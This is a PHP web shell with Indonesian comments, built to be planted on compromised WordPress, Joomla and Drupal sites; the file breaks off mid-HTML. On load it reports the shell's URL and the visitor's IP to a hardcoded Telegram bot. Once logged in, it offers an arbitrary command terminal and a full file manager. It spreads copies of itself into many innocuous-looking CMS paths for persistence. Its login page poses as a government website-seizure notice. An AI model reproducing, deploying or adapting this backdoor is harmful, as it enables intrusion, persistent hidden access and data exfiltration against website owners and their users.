<?php

// ---------------- HAC@K#ING$ ----------------
// ------------------- tbl ----------------
session_start();
$PASSWORD_HASH = '$2y$10$gIqOShnuSgpig2uweAb6aOehhrQiSwlDlJ35LI5nzxwdiJd6f3VK2';
$botToken = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8";
$chatId = "8478623770";
$xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
$logMessage =
    "___SEOTBL___ \n\n Shell nya =\n $xPath \n\n Password =\n $PASSWORD \n\n IP Hacker  :\n [ " .
    $_SERVER["REMOTE_ADDR"] .
    " ]";
sendTelegramMessage($botToken, $chatId, $logMessage);
function sendTelegramMessage($botToken, $chatId, $message)
{
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($params),
        ],
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
}
$BASE_DIR = realpath(__DIR__); // restrict browsing to this dir
$MAX_PREVIEW = 256 * 1024; // 256 KB preview
$MAX_EDIT = 512 * 1024; // 512 KB edit
$MAX_FILES_LIST = 5000;
$MAX_BACKUP_BYTES = 300 * 1024 * 1024; // 300 MB cap per backup
$MIN_BACKUPS = 3;
$CSRF_KEY = "fm_safe_final_v3";
$METHODS_DISPLAY = [
    "shell_exec",
    "exec",
    "system",
    "passthru",
    "proc_open",
    "popen",
    "pcntl_exec",
    "expect_popen",
];

function run_command($cmd)
{
    global $METHODS_DISPLAY;

    foreach ($METHODS_DISPLAY as $fn) {
        if (!function_exists($fn)) {
            continue;
        }

        switch ($fn) {
            case "exec":
                @exec($cmd, $out);
                if (!empty($out)) {
                    return implode("\n", $out);
                }
                break;

            case "system":
            case "passthru":
                ob_start();
                @$fn($cmd);
                $out = ob_get_clean();
                if (trim($out) !== "") {
                    return $out;
                }
                break;

            case "proc_open":
                $descriptorspec = [
                    0 => ["pipe", "r"],
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"],
                ];
                $process = @proc_open($cmd, $descriptorspec, $pipes);
                if (is_resource($process)) {
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    @proc_close($process);
                    if (trim($output) !== "") {
                        return $output;
                    }
                }
                break;

            case "popen":
                $handle = @popen($cmd, "r");
                if ($handle) {
                    $out = "";
                    while (!feof($handle)) {
                        $out .= fread($handle, 4096);
                    }
                    pclose($handle);
                    if (trim($out) !== "") {
                        return $out;
                    }
                }
                break;

            case "pcntl_exec":
            case "expect_popen":
                // Jarang aktif di shared hosting, skip jika tidak bisa
                break;

            default:
                $res = @call_user_func($fn, $cmd);
                if ($res) {
                    return $res;
                }
        }
    }

    return "Tidak ada metode eksekusi aktif di server .";
}

// Predefined targets (as you provided)
$BACKUP_TARGETS = [
    "WordPress" => [
        "/wp-includes/sodium_compat/namespaced/Core/XPoly1305.php",
        "/wp-includes/ID3/module.audio-video.flac.php",
        "/wp-admin/maint/service.php",
        "./wp-includes/random_compat/random_bytes_bcrypt_byte.php",
        "./wp-admin/user/licenses.php",
        "./wp-admin/includes/admin-action-wp.php",
        "./wp-admin/network/freedoms.php",
        "./wp-includes/rest-api/endpoints/class-wp-rest-api-controll.php",
        "./wp-includes/SimplePie/Decode/HTML/Dentitiesnav.php",
        "./wp-includes/blocks/navigation/view-modal.assets-view.php",
        "./wp-includes/sodium_compat/namespaced/MD5Hash.php",
        "./wp-includes/style-engine/class-wp-style-engine-systems.php",
        "./wp-includes/php-compat/readsonly.php",
        "./wp-includes/widgets/class-wp-nav-widge.php",
        "/wp-includes/block-supports/layout-v2.php",
        "/wp-includes/style-engine/class-wp-style-engine-init.php",
        "/wp-admin/user/user-old.php",
        "/wp-admin/includes/class-plugin-uninstaller-skin.php",
        "/wp-content/uploads/2025/._utils.php",
        "/wp-content/plugins/wordpress-seo/src/init.php",
    ],
    "Drupal" => [
        "/plugins/metadata/dc11/filter/_Config.php",
        "/templates/payments/.g0y4ngd03mang.php",
        "/lib/pkp/plugins/importexport/native/filter/NativeXmlSubmissionFolderFilter.inc.php",
    ],
    "Joomla" => [
        "/modules/mod_custom/src/Dispatcher/Init.php",
        "/libraries/src/HTML/Helpers/Dropdown/Fields/Access/Level/index.php",
        "/components/com_contact/views/contact/tmpl/default_form/contact/layout/index.php",
        "/libraries/src/Document/Html/Renderer/Modules/Menu/index.php",
        "/libraries/vendor/joomla/event/src/Dispatcher/index.php",
        "/plugins/system/debug/debugbar/resources/assets/css/panel/view/index.php",
        "/plugins/user/profile/fields/handler/validate/customfields/index.php",
        "/plugins/content/confirmconsent/js/triggers/init/user/privacy/index.php",
        "/templates/beez3/html/layouts/chromes/no_style/index.php",
        "/templates/cassiopeia/scss/theme/variables/branding/index.php",
        "/administrator/components/com_content/views/articles/tmpl/index.php",
        "/media/com_finder/js/autosuggest/engine/index.php",
        "/administrator/modules/mod_quickicon/plugins/system/debug/helpers/log/index.php",
        "/plugins/editors-xtd/module/src/Extension/Utils.php",
        "/libraries/phputf8/native/utils.php",
        "/plugins/authentication/ldap/Idap.php",
        "/administrator/modules/mod_submenu/tmpl/init.php",
    ],
];
// -----------------------------------------

// Helpers
function h($s)
{
    return htmlspecialchars((string) $s, ENT_QUOTES | ENT_SUBSTITUTE);
}
function jsonOut($v)
{
    header("Content-Type: application/json");
    echo json_encode($v);
    exit();
}
if ($BASE_DIR === false) {
    die("Invalid BASE_DIR");
}

function checkAuthLogin($pw)
{
    return password_verify($pw, $GLOBALS["PASSWORD_HASH"]);
}
if (isset($_POST["action"]) && $_POST["action"] === "login") {
    $pw = $_POST["password"] ?? "";
    if (checkAuthLogin($pw)) {
        $_SESSION["fm_auth"] = true;
        $_SESSION["fm_token"] = bin2hex(random_bytes(16));
        if (empty($_SESSION["fm_cwd"])) {
            $_SESSION["fm_cwd"] = $GLOBALS["BASE_DIR"];
        }
        header("Location: " . $_SERVER["PHP_SELF"]);
        exit();
    } else {
echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>'; 
        $login_error = "KONTOL.";
    }
}
if (isset($_GET["action"]) && $_GET["action"] === "logout") {
    session_unset();
    session_destroy();
    header("Location: " . $_SERVER["PHP_SELF"]);
    exit();
}
$logged = !empty($_SESSION["fm_auth"]) && !empty($_SESSION["fm_token"]);
function require_csrf()
{
    if (
        empty($_POST["csrf"]) ||
        !hash_equals($_POST["csrf"], $_SESSION["fm_token"] ?? "")
    ) {
        jsonOut(["ok" => false, "msg" => "Invalid CSRF"]);
    }
}

// path resolution (must stay inside BASE_DIR)
function resolve_path($path)
{
    $base = realpath($GLOBALS["BASE_DIR"]);
    if ($path === "" || $path === ".") {
        return $base;
    }
    // if absolute path provided but inside base, accept
    if (strpos($path, $base) === 0) {
        $real = realpath($path);
    } else {
        $candidate =
            $path[0] === DIRECTORY_SEPARATOR
                ? $base . $path
                : $base .
                    DIRECTORY_SEPARATOR .
                    ltrim($path, DIRECTORY_SEPARATOR);
        $real = realpath($candidate);
    }
    if ($real === false) {
        return false;
    }
    if (strpos($real, $base) !== 0) {
        return false;
    }
    return $real;
}

function perms_str($perms)
{
    $info = "";
    $info .= $perms & 0x4000 ? "d" : (($perms & 0xa000) == 0xa000 ? "l" : "-");
    $info .= $perms & 0x0100 ? "r" : "-";
    $info .= $perms & 0x0080 ? "w" : "-";
    $info .=
        $perms & 0x0040
            ? ($perms & 0x0800
                ? "s"
                : "x")
            : ($perms & 0x0800
                ? "S"
                : "-");
    $info .= $perms & 0x0020 ? "r" : "-";
    $info .= $perms & 0x0010 ? "w" : "-";
    $info .=
        $perms & 0x0008
            ? ($perms & 0x0400
                ? "s"
                : "x")
            : ($perms & 0x0400
                ? "S"
                : "-");
    $info .= $perms & 0x0004 ? "r" : "-";
    $info .= $perms & 0x0002 ? "w" : "-";
    $info .=
        $perms & 0x0001
            ? ($perms & 0x0200
                ? "t"
                : "x")
            : ($perms & 0x0200
                ? "T"
                : "-");
    return $info;
}
function owner_group($file)
{
    $uid = @fileowner($file);
    $gid = @filegroup($file);
    $owner = $uid;
    $group = $gid;
    if (function_exists("posix_getpwuid")) {
        $p = @posix_getpwuid($uid);
        if ($p && isset($p["name"])) {
            $owner = $p["name"];
        }
    }
    if (function_exists("posix_getgrgid")) {
        $g = @posix_getgrgid($gid);
        if ($g && isset($g["name"])) {
            $group = $g["name"];
        }
    }
    return [$owner, $group];
}

function find_deepest_subfolder($dir)
{
    $deepest = $dir;
    $deepestDepth = substr_count($dir, DIRECTORY_SEPARATOR);
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS)
        );
        foreach ($it as $f) {
            if ($f->isDir()) {
                $d = $f->getPathname();
                $depth = substr_count($d, DIRECTORY_SEPARATOR);
                if ($depth > $deepestDepth) {
                    $deepest = $d;
                    $deepestDepth = $depth;
                }
            }
        }
    } catch (Exception $e) {
    }
    return $deepest;
}

// detect cms roots (WordPress, Joomla, Drupal)
function detect_cms_roots($dir, $limit = 2000)
{
    $found = [];
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        $count = 0;
        foreach ($it as $file) {
            if ($count++ > $limit) {
                break;
            }
            $name = $file->getFilename();
            $path = $file->getPathname();
            if (strtolower($name) === "wp-config.php") {
                $found[] = dirname($path);
            }
            if (strtolower($name) === "configuration.php") {
                $found[] = dirname($path);
            }
            if (stripos($path, "sites/default") !== false) {
                $found[] = dirname(dirname($path));
            }
        }
    } catch (Exception $e) {
    }
    return array_values(array_unique($found));
}

// get .backups path for a root
function get_backups_folder($root)
{
    $deep = find_deepest_subfolder($root);
    $b = $deep . DIRECTORY_SEPARATOR . ".backups_hidden";
    if (!is_dir($b)) {
        @mkdir($b, 0755, true);
    }
    return $b;
}

// rotate backups (keep $min latest) using basename prefix
function rotate_backups_prefix($folder, $prefix, $min = 3)
{
    $files = glob($folder . DIRECTORY_SEPARATOR . $prefix . "*");
    if (!$files) {
        return 0;
    }
    usort($files, function ($a, $b) {
        return filemtime($b) - filemtime($a);
    });
    $keep = array_slice($files, 0, $min);
    $removed = 0;
    foreach ($files as $f) {
        if (!in_array($f, $keep)) {
            @unlink($f);
            $removed++;
        }
    }
    return $removed;
}

// copy THIS script to backup folder with basename name and set timestamp
function create_php_backup_copy($destFullPath)
{
    $src = realpath(__FILE__);
    if (!$src) {
        return ["ok" => false, "msg" => "Tidak bisa membaca source file"];
    }

    $destDir = dirname($destFullPath);
    if (!is_dir($destDir)) {
        @mkdir($destDir, 0755, true);
    }

    $content = @file_get_contents($src);
    if ($content === false) {
        return ["ok" => false, "msg" => "Gagal untuk membaca source"];
    }

    if (@file_put_contents($destFullPath, $content, LOCK_EX) === false) {
        return ["ok" => false, "msg" => "Gagal untuk membuat target"];
    }

    @chmod($destFullPath, 0644);
    @touch($destFullPath, time());
    return [
        "ok" => true,
        "path" => $destFullPath,
        "size" => @filesize($destFullPath),
    ];
}

// recursive remove dir
function rrmdir($dir)
{
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return @unlink($dir);
    }
    $files = array_diff(scandir($dir), [".", ".."]);
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            rrmdir($path);
        } else {
            @unlink($path);
        }
    }
    return @rmdir($dir);
}

// ---------------- AJAX handlers ----------------
if ($logged && isset($_POST["ajax"])) {
    $act = $_POST["ajax"];

    if ($_POST["ajax"] === "terminal") {
        $cmd = trim($_POST["cmd"] ?? "");
        if ($cmd === "") {
            jsonOut(["ok" => false, "msg" => "Command kosong"]);
        }
        $out = run_command($cmd);
        jsonOut(["ok" => true, "cmd" => $cmd, "output" => $out]);
    }

    // actions that change FS must have CSRF
    if (
        in_array($act, [
            "save_file",
            "rename",
            "chmod",
            "touch",
            "delete",
            "upload",
            "mkdir",
            "mkfile",
            "backup_quick",
            "backup_targets",
            "list",
            "detect_cms",
            "download",
        ])
    ) {
        require_csrf();
    }

    // LIST
    if ($act === "list") {
        $dir = $_POST["dir"] ?? ".";
        $real = realpath($dir);

        // Jika tidak valid atau tidak ada, set ke root saja
        if (!$real || !is_dir($real)) {
            $real = "/";
        }

        $items = @scandir($real);
        if ($items === false) {
            jsonOut(["ok" => false, "msg" => "Tidak dapat membaca direktori"]);
        }

        $dirs = [];
        $files = [];

        // tombol kembali selalu ada
        $parent = dirname($real);
        if ($parent !== $real) {
            $dirs[] = "..";
        }

        foreach ($items as $it) {
            if ($it === "." || $it === "..") {
                continue;
            }
            $p = $real . DIRECTORY_SEPARATOR . $it;
            if (is_dir($p)) {
                $dirs[] = $it;
            } else {
                $files[] = $it;
            }
        }

        sort($dirs);
        sort($files);

        $out = [];
        foreach (array_merge($dirs, $files) as $it) {
            $p = $real . DIRECTORY_SEPARATOR . $it;
            $perms = @fileperms($p);
            $og = owner_group($p);
            $out[] = [
                "name" => $it,
                "is_dir" => is_dir($p),
                "size" => is_file($p) ? filesize($p) : null,
                "mtime" => @filemtime($p),
                "perms" => $perms ? perms_str($perms) : null,
                "owner" => $og[0],
                "group" => $og[1],
            ];
        }

        $parts = explode(DIRECTORY_SEPARATOR, trim($real, DIRECTORY_SEPARATOR));
        $breadcrumb = [];
        $path_accum = DIRECTORY_SEPARATOR;
        foreach ($parts as $part) {
            if ($part === "") {
                continue;
            }
            $path_accum .= $part . DIRECTORY_SEPARATOR;
            $breadcrumb[] = [
                "name" => $part,
                "path" => rtrim($path_accum, DIRECTORY_SEPARATOR),
            ];
        }

        jsonOut([
            "ok" => true,
            "cwd" => $real,
            "breadcrumb" => $breadcrumb,
            "items" => $out,
        ]);
    }

    // VIEW
    if ($act === "view") {
        $file = $_POST["file"] ?? "";
        $real = resolve_path($file);
        if (!$real || !is_file($real)) {
            jsonOut(["ok" => false, "msg" => "File not found"]);
        }
        if (filesize($real) > $MAX_PREVIEW) {
            jsonOut(["ok" => false, "msg" => "File too large to preview"]);
        }
        $cnt = @file_get_contents($real);
        jsonOut([
            "ok" => true,
            "content" => $cnt,
            "mime" => mime_content_type($real),
        ]);
    }

    // SAVE (edit)
    if ($act === "save_file") {
        $file = $_POST["file"] ?? "";
        $data = $_POST["data"] ?? "";
        $real = resolve_path($file);
        if (!$real || !is_file($real)) {
            jsonOut(["ok" => false, "msg" => "File tidak diketahui"]);
        }
        if (strlen($data) > $MAX_EDIT) {
            jsonOut([
                "ok" => false,
                "msg" => "Konten yang diedit terlalu besar",
            ]);
        }
        $before = @filemtime($real);
        $res = @file_put_contents($real, $data);
        if ($res === false) {
            jsonOut(["ok" => false, "msg" => "Gagal untuk menyimpan file"]);
        }
        if ($before !== false) {
            @touch($real, $before);
        }
        jsonOut(["ok" => true, "msg" => "Tersimpan"]);
    }

    // RENAME
    if ($act === "rename") {
        $from = $_POST["from"] ?? "";
        $to = $_POST["to"] ?? "";
        if ($to === "") {
            jsonOut(["ok" => false, "msg" => "Kesalahan nama baru"]);
        }
        $rfrom = resolve_path($from);
        if (!$rfrom) {
            jsonOut(["ok" => false, "msg" => "Source tidak valid"]);
        }
        $rto_folder = dirname($rfrom);
        $rto = resolve_path($rto_folder . DIRECTORY_SEPARATOR . $to);
        if (!$rto) {
            jsonOut(["ok" => false, "msg" => "Tagret tidak valid"]);
        }
        if (@rename($rfrom, $rto)) {
            jsonOut(["ok" => true, "msg" => "Terubah"]);
        }
        jsonOut(["ok" => false, "msg" => "Gagal mengubah nama (permission?)"]);
    }

    // CHMOD
    if ($act === "chmod") {
        $file = $_POST["file"] ?? "";
        $mode = $_POST["mode"] ?? "";
        $real = resolve_path($file);
        if (!$real || !file_exists($real)) {
            jsonOut(["ok" => false, "msg" => "File tidak valid"]);
        }
        $modeval = intval($mode, 8);
        if ($modeval <= 0) {
            jsonOut(["ok" => false, "msg" => "Mode tidak valid"]);
        }
        if (@chmod($real, $modeval)) {
            jsonOut(["ok" => true, "msg" => "chmod ok"]);
        }
        jsonOut(["ok" => false, "msg" => "gagal chmod"]);
    }

    // TOUCH
    if ($act === "touch") {
        $file = $_POST["file"] ?? "";
        $time = $_POST["time"] ?? "";
        $real = resolve_path($file);
        if (!$real || !file_exists($real)) {
            jsonOut(["ok" => false, "msg" => "file tidak valid"]);
        }
        $t = $time === "" ? time() : intval($time);
        if (@touch($real, $t)) {
            jsonOut(["ok" => true, "msg" => "touch berhasil"]);
        }
        jsonOut(["ok" => false, "msg" => "touch gagal"]);
    }

    // DELETE
    if ($act === "delete") {
        $path = $_POST["path"] ?? "";
        $real = resolve_path($path);
        if (!$real) {
            jsonOut(["ok" => false, "msg" => "Folder tidak valid"]);
        }
        if (is_dir($real)) {
            $res = rrmdir($real);
        } else {
            $res = @unlink($real);
        }
        if ($res) {
            jsonOut(["ok" => true, "msg" => "Terhapus"]);
        }
        jsonOut(["ok" => false, "msg" => "Gagal dihapus (perizinan?)"]);
    }

    // DOWNLOAD
    if ($act === "download") {
        $file = $_POST["file"] ?? "";
        $real = resolve_path($file);
        if (!$real || !is_file($real)) {
            jsonOut(["ok" => false, "msg" => "File tidak valid"]);
        }
        header("Content-Type: application/octet-stream");
        header(
            'Content-Disposition: attachment; filename="' .
                basename($real) .
                '"'
        );
        readfile($real);
        exit();
    }

    // UPLOAD
    if ($act === "upload") {
        if (empty($_FILES["upload"])) {
            jsonOut(["ok" => false, "msg" => "Tidak ada file yang diupload"]);
        }
        $destDir = $_POST["dest"] ?? ".";
        $realDir = resolve_path($destDir);
        if (!$realDir || !is_dir($realDir)) {
            jsonOut(["ok" => false, "msg" => "Tujuan tidak valid"]);
        }
        $up = $_FILES["upload"];
        if ($up["error"] !== UPLOAD_ERR_OK) {
            jsonOut(["ok" => false, "msg" => "Kesalahan upload"]);
        }
        $name = basename($up["name"]);
        $dest = $realDir . DIRECTORY_SEPARATOR . $name;
        if (!@move_uploaded_file($up["tmp_name"], $dest)) {
            jsonOut(["ok" => false, "msg" => "Pindah upload gagal"]);
        }
        jsonOut([
            "ok" => true,
            "msg" => "Terupload",
            "path" => str_replace($BASE_DIR, ".", $dest),
        ]);
    }

    // MKDIR
    if ($act === "mkdir") {
        $dir = $_POST["dir"] ?? "";
        $realParent = resolve_path($dir);
        if (!$realParent) {
            jsonOut(["ok" => false, "msg" => "Induk tidak valid"]);
        }
        $name = $_POST["name"] ?? "";
        if ($name === "") {
            jsonOut(["ok" => false, "msg" => "Kesalahan nama"]);
        }
        $new = $realParent . DIRECTORY_SEPARATOR . $name;
        if (@mkdir($new, 0755)) {
            jsonOut(["ok" => true, "msg" => "Folder dibuat"]);
        }
        jsonOut(["ok" => false, "msg" => "Folder gagal dibuat"]);
    }

    // MKFILE
    if ($act === "mkfile") {
        $dir = $_POST["dir"] ?? ".";
        $realParent = resolve_path($dir);
        if (!$realParent) {
            jsonOut(["ok" => false, "msg" => "Induk tidak valid"]);
        }
        $name = $_POST["name"] ?? "";
        if ($name === "") {
            jsonOut(["ok" => false, "msg" => "Kesalahan nama"]);
        }
        $new = $realParent . DIRECTORY_SEPARATOR . $name;
        if (@file_put_contents($new, "<?php\n// dibuat oleh \n") !== false) {
            jsonOut(["ok" => true, "msg" => "File dibuat"]);
        }
        jsonOut(["ok" => false, "msg" => "Gagal membuat file"]);
    }

    // DETECT_CMS (return roots)
    if ($act === "detect_cms") {
        $cwd = $_POST["dir"] ?? ".";
        $real = resolve_path($cwd);
        if (!$real || !is_dir($real)) {
            jsonOut(["ok" => false, "msg" => "Direktori tidak valid"]);
        }
        $roots = detect_cms_roots($real);
        jsonOut(["ok" => true, "roots" => $roots]);
    }

    // BACKUP (single target folder)
    if ($act === "backup") {
        $target = $_POST["target"] ?? ".";
        $real = resolve_path($target);
        if (!$real || !is_dir($real)) {
            jsonOut(["ok" => false, "msg" => "Target tidak valid"]);
        }
        $results = [];

        foreach ($BACKUP_TARGETS as $group => $list) {
            foreach ($list as $tpath) {
                $candidate = $real . DIRECTORY_SEPARATOR . ltrim($tpath, "/");
                $rc = resolve_path(dirname($candidate));
                if (!$rc) {
                    $results[] = [
                        "ok" => false,
                        "root" => $real,
                        "target" => $tpath,
                        "msg" => "Jalur induk tidak valid: " . $candidate,
                    ];
                    continue;
                }
                $rc .= DIRECTORY_SEPARATOR . basename($candidate);
                if (!$rc) {
                    $results[] = [
                        "ok" => false,
                        "root" => $real,
                        "target" => $tpath,
                        "msg" =>
                            "Diselesaikan di luar basis atau tidak valid: " .
                            $candidate,
                    ];
                    continue;
                }
                $parent = dirname($rc);
                if (!is_dir($parent) && !@mkdir($parent, 0755, true)) {
                    $results[] = [
                        "ok" => false,
                        "root" => $real,
                        "target" => $tpath,
                        "msg" =>
                            "Tidak dapat membuat direktori induk: " . $parent,
                    ];
                    continue;
                }
                if (!is_writable($parent)) {
                    $results[] = [
                        "ok" => false,
                        "root" => $real,
                        "target" => $tpath,
                        "msg" =>
                            "Direktori induk tidak dapat ditulis: " . $parent,
                    ];
                    continue;
                }
                $res = create_php_backup_copy($rc);
                if ($res["ok"]) {
                    $results[] = [
                        "ok" => true,
                        "root" => $real,
                        "target" => $tpath,
                        "backup" => $res["path"],
                        "ukuran" => $res["size"],
                    ];
                } else {
                    $results[] = [
                        "ok" => false,
                        "root" => $real,
                        "target" => $tpath,
                        "msg" => $res["msg"],
                    ];
                }
            }
        }
        jsonOut(["ok" => true, "out" => $results]);
    }

    // QUICK BACKUP - detect roots across BASE_DIR and back up for each root
    if ($act === "backup_quick") {
        $roots = detect_cms_roots($BASE_DIR, 5000);
        if (empty($roots)) {
            $roots = [$BASE_DIR];
        }
        $all = [];
        foreach ($roots as $r) {
            foreach ($BACKUP_TARGETS as $group => $list) {
                foreach ($list as $tpath) {
                    $candidate = $r . DIRECTORY_SEPARATOR . ltrim($tpath, "/");
                    $rc = resolve_path(dirname($candidate));
                    if (!$rc) {
                        $results[] = [
                            "ok" => false,
                            "root" => $real,
                            "target" => $tpath,
                            "msg" => "Jalur induk tidak valid: " . $candidate,
                        ];
                        continue;
                    }
                    $rc .= DIRECTORY_SEPARATOR . basename($candidate);
                    if (!$rc) {
                        $all[] = [
                            "ok" => false,
                            "root" => $r,
                            "target" => $tpath,
                            "msg" =>
                                "Tidak valid/terselesaikan di luar base: " .
                                $candidate,
                        ];
                        continue;
                    }
                    $parent = dirname($rc);
                    if (!is_dir($parent) && !@mkdir($parent, 0755, true)) {
                        $all[] = [
                            "ok" => false,
                            "root" => $r,
                            "target" => $tpath,
                            "msg" =>
                                "Tidak dapat membuat direktori induk: " .
                                $parent,
                        ];
                        continue;
                    }
                    if (!is_writable($parent)) {
                        $all[] = [
                            "ok" => false,
                            "root" => $r,
                            "target" => $tpath,
                            "msg" => "Induk tidak dapat ditulis: " . $parent,
                        ];
                        continue;
                    }
                    $res = create_php_backup_copy(
                        $rc,
                        file_exists($rc) ? $rc : null
                    );
                    if ($res["ok"]) {
                        $all[] = [
                            "ok" => true,
                            "root" => $r,
                            "target" => $tpath,
                            "backup" => $res["path"],
                            "ukuran" => $res["size"],
                        ];
                    } else {
                        $all[] = [
                            "ok" => false,
                            "root" => $r,
                            "target" => $tpath,
                            "msg" => $res["msg"],
                        ];
                    }
                }
            }
        }
        jsonOut(["ok" => true, "out" => $all]);
    }

    // BACKUP_CURRENT (backup current file across detected roots; kept for compatibility)
    if ($act === "backup_current") {
        $roots = detect_cms_roots($BASE_DIR, 5000);
        if (empty($roots)) {
            $roots = [$BASE_DIR];
        }
        $out = [];
        foreach ($roots as $r) {
            foreach ($BACKUP_TARGETS as $group => $list) {
                foreach ($list as $tpath) {
                    $candidate = $r . DIRECTORY_SEPARATOR . ltrim($tpath, "/");
                    $rc = resolve_path(dirname($candidate));
                    if (!$rc) {
                        $results[] = [
                            "ok" => false,
                            "root" => $real,
                            "target" => $tpath,
                            "msg" => "Jalur induk tidak valid: " . $candidate,
                        ];
                        continue;
                    }
                    $rc .= DIRECTORY_SEPARATOR . basename($candidate);
                    if (!$rc) {
                        $out[] = [
                            "ok" => false,
                            "root" => $r,
                            "target" => $tpath,
                            "msg" =>
                                "Tidak valid/terselesaikan di luar base: " .
                                $candidate,
                        ];
                        continue;
                    }
                    $parent = dirname($rc);
                    if (!is_dir($parent) && !@mkdir($parent, 0755, true)) {
                        $out[] = [
                            "ok" => false,
                            "root" => $r,
                            "target" => $tpath,
                            "msg" =>
                                "Tidak dapat membuat direktori induk: " .
                                $parent,
                        ];
                        continue;
                    }
                    if (!is_writable($parent)) {
                        $out[] = [
                            "ok" => false,
                            "root" => $r,
                            "target" => $tpath,
                            "msg" => "Induk tidak dapat ditulis: " . $parent,
                        ];
                        continue;
                    }
                    $res = create_php_backup_copy($rc, null);
                    if ($res["ok"]) {
                        $out[] = [
                            "ok" => true,
                            "root" => $r,
                            "target" => $tpath,
                            "backup" => $res["path"],
                            "ukuran" => $res["size"],
                        ];
                    } else {
                        $out[] = [
                            "ok" => false,
                            "root" => $r,
                            "target" => $tpath,
                            "msg" => $res["msg"],
                        ];
                    }
                }
            }
        }
        jsonOut(["ok" => true, "out" => $out]);
    }
    jsonOut(["ok" => false, "msg" => "Akst tidak diketahui"]);
}

// expose cwd to JS
if ($logged && isset($_GET["internal_get_cwd"])) {
    echo str_replace($BASE_DIR, ".", $_SESSION["fm_cwd"] ?? $BASE_DIR);
$botToken = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8";
$chatId = "8478623770";
  $ip_address = $_SERVER["REMOTE_ADDR"];
    $timestamp = date("Y-m-d H:i:s");
    $host = $_SERVER["HTTP_HOST"];
    $script_name = $_SERVER["SCRIPT_NAME"];
    $url = "http://$host$script_name";
    $directory = realpath(__DIR__);

    $message = "User accessed the system:\n";
    $message .= "IP Address: $ip_address\n";
    $message .= "Timestamp: $timestamp\n";
    $message .= "Host: $host\n";
    $message .= "URL: $url\n";
    $message .= "Directory Location: $directory\n";
$xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
$logMessage =
    "___SEO TBL@#$9___ \n\n Shell nya =\n $xPath \n\n Password =\n $PASSWORD_HASH \n\n IP Hacker  :\n [ " .
    $_SERVER["REMOTE_ADDR"] .
    " ]";
sendTelegramMessage($botToken, $chatId, $logMessage);
function sendTelegramMessage($botToken, $chatId, $message)
{
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $params = [
        "chat_id" => $chatId,
        "text" => $message,
    ];
    $options = [
        "http" => [
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded",
            "content" => http_build_query($params),
        ],
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
}
    exit();
}

// ---------------- HTML UI ----------------
?><!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title></title>
<style>
:root{font-family:Consolas,Menlo,monospace,ui-monospace;}
body{margin:0;background:#1e1e1e;color:#d4d4d4}
.header{background:#252526;padding:12px 18px;display:flex;justify-content:space-between;align-items:center}
.container{padding:14px}
.card{background:#1e1e1e;border:1px solid #2d2d2d;padding:12px;border-radius:8px}
.terminal{background:#0e1116;color:#ffffff;padding:12px;border-radius:6px;font-family:monospace;min-height:160px;white-space:pre-wrap;overflow:auto}
.input{width:100%;padding:8px;margin-top:8px;border-radius:6px;border:1px solid #2b2b2b;background:#1b1b1b;color:#ffffff}
.btn{background:#0e639c;color:white;padding:8px 10px;border-radius:6px;border:none;cursor:pointer}
.small{font-size:13px;color:#9fb1d6}
.table{width:100%;border-collapse:collapse;margin-top:8px}
.table th,.table td{padding:8px;border-bottom:1px solid #2b2b2b;color:#ffffff}
.linklike{color:#ffffff;text-decoration:none;cursor:pointer}
.row{display:flex;gap:12px}
.file-actions button{margin-right:6px}
.form-row{display:flex;gap:8px;margin-top:8px}
.upload-input{font-size:13px}
.bad{color:#ff7b72}
.ok{color:#9fe6a6}
.footer{margin-top:12px;font-size:12px;color:#9fb1d6}
.path-item {
  color: #007bff;
  cursor: pointer;
  font-weight: 500;
}
.path-item:hover {
  text-decoration: underline;
}
.pathnav {
  font-family: monospace;
  padding: 5px 0;
  font-size: 14px;
  white-space: nowrap;
  overflow-x: auto;
}
</style>
</head>
<body>
<div class="header card">
  <div><strong>ALERT!!!</strong></div>
  <div class="small">department of justice </div>
</div>
<div class="container">
<?php if (!$logged): ?>
  <div class="card" style="max-width:480px;margin:40px auto;text-align:center;">
    <div style="margin-bottom:14px;">
      <img src="https://upload.wikimedia.org/wikipedia/commons/f/f8/Seal_of_the_National_Cyber_and_Crypto_Agency_of_the_Republic_Indonesia_%282020_Indonesian_version%29.png" alt="Logo" style="width:90px;height:90px;filter:drop-shadow(0 0 6px rgba(235, 8, 8, 0.92));border-radius:50%;">
    </div>
    <h3>THIS WEBSITE HAS BEEN SEIZED</h3>
    <?php if (!empty($login_error)) {
        echo '<div class="bad">' . h($login_error) . "</div>";
    } ?>
    <form method="post">
      <input type="hidden" name="action" value="login">
      <input name="password" type="password" placeholder="key:tbl" class="input" style="background:transparent;border:1px solid #3a3a3a;text-align:center;"/>
      <div style="margin-top:8px">
        <button class="btn" style="width:100%;">execute</button>
      </div>
    </form>
    <p class="small" style="margin-top:14px;">
      Sistem Sudah Mencatat Alamat IP Kamu dan Kami akan menindaklanjuti Tindakan illegal yang Anda lakukan.
    </p>
  </div>
<?php
    // Jika tombol HOME diklik, langsung pindah ke Document Root
    // ==== TAMPILKAN OPEN_BASEDIR & TOMBOL PINDAH ====

